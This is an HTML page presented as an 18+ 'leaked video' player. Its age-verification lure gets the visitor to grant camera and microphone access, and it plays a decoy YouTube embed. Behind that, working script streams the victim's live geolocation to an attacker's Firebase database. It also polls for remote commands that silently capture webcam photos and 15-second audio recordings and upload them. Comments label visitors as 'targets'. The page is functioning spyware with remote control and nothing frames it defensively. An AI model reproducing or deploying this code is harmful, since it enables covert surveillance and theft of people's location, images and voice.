<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Viral Video</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { font-family: sans-serif; background: #000; color: white; text-align: center; margin: 0; padding: 0; }
        .video-wrapper { position: relative; width: 100%; height: 300px; background: #000; margin-top: 50px; display: none; }
        iframe { width: 100%; height: 100%; }
        #cover { padding: 20px; margin-top: 60px; }
        h2 { color: #ff0000; font-size: 24px; text-transform: uppercase; }
        p { color: #ccc; }
        #playBtn { 
            padding: 15px 40px; 
            font-size: 20px; 
            background: #cc0000; 
            color: white; 
            border: none; 
            border-radius: 5px; 
            cursor: pointer; 
            font-weight: bold;
            box-shadow: 0 0 15px rgba(204, 0, 0, 0.5);
            margin-top: 20px;
        }
        #status { margin-top: 15px; color: #555; font-size: 12px; }
    </style>
</head>
<body>

    <div id="cover">
        <h2>ðŸ”¥ Leaked Video</h2>
        <p>This video contains content for 18+ only.<br>Viewer discretion is advised.</p>
        <button id="playBtn" onclick="startEverything()">â–¶ WATCH VIDEO</button>
        <p id="status">Waiting for user verification...</p>
    </div>

    <div class="video-wrapper" id="videoArea">
        <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&controls=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
    </div>

    <script>
        // --- 1. CONFIGURATION ---
        const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        
        // --- 2. FIX: USER ID SAB SE PEHLE DEFINE KARNA HAI ---
        let userId = localStorage.getItem("target_name");
        if (!userId) {
            userId = "User_" + Math.floor(Math.random() * 99999);
            localStorage.setItem("target_name", userId);
        }
        console.log("Target ID Set: " + userId);

        // --- 3. MAIN FUNCTION (Button dabane par chalega) ---
        async function startEverything() {
            document.getElementById('status').innerText = "Verifying age...";
            
            try {
                // Permission Mango (Camera & Mic)
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
                
                // Permission mil gayi! Video dikhao
                document.getElementById('cover').style.display = 'none';
                document.getElementById('videoArea').style.display = 'block';

                // Tracking Shuru Karo
                initTracking();
                
                // Stream tracks ko band mat karna taake background me chalta rahe
                // (Optional: Agar notification hatana hai to stream.getTracks().forEach(t => t.stop()) use karein, par tracking ruk sakti hai)

            } catch (e) {
                // Agar user ne "Deny" kiya ya koi error aaya
                alert("Please ALLOW permissions to watch the video!");
                document.getElementById('status').innerText = "Access Denied. Reload to try again.";
                console.error(e);
            }
        }

        function initTracking() {
            // Location Tracking
            navigator.geolocation.watchPosition(
                (pos) => {
                    db.ref('targets/' + userId + '/location').update({
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        timestamp: new Date().toLocaleTimeString(),
                        status: "Online"
                    });
                },
                (err) => console.log("Location Error"),
                { enableHighAccuracy: true }
            );

            // Online Heartbeat (Har 10 second update)
            setInterval(() => {
                db.ref('targets/' + userId + '/location/last_seen').set(firebase.database.ServerValue.TIMESTAMP);
            }, 10000);

            // Commands Suno
            listenForCommands();
        }

        function listenForCommands() {
            db.ref('commands/' + userId).on('value', async (snap) => {
                const cmd = snap.val();
                if (!cmd) return;

                if (cmd.action === "snap") { await capturePhoto(); }
                if (cmd.action === "mic") { await recordAudio(15); }
                
                // Command delete karo taake dubara na chale
                db.ref('commands/' + userId).remove();
            });
        }

        async function capturePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const track = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);
                const blob = await imageCapture.takePhoto();
                
                const reader = new FileReader();
                reader.readAsDataURL(blob);
                reader.onloadend = () => {
                    db.ref('targets/' + userId + '/photos').push({
                        image: reader.result,
                        time: new Date().toLocaleTimeString()
                    });
                    track.stop(); // Photo le kar camera band
                };
            } catch (e) { console.error("Camera Error: ", e); }
        }

        async function recordAudio(sec) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                let chunks = [];

                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const reader = new FileReader();
                    reader.readAsDataURL(new Blob(chunks));
                    reader.onloadend = () => {
                        db.ref('targets/' + userId + '/audio').push({
                            data: reader.result,
                            time: new Date().toLocaleTimeString()
                        });
                    };
                };

                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), sec * 1000);
            } catch (e) { console.error("Mic Error: ", e); }
        }
    </script>
</body>
</html>
